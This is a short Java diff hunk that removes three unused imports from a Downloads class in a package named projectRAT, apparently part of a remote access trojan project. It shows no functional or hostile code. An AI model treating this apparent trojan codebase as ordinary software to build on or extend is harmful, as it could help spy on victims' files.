@@ -4,11 +4,8 @@ import in.momin5.projectRAT.ProjectRAT;
 import in.momin5.projectRAT.request.Request;
 
 import java.io.File;
-import java.io.FilenameFilter;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
-import java.util.Locale;
 
 public class Downloads implements Request {
 
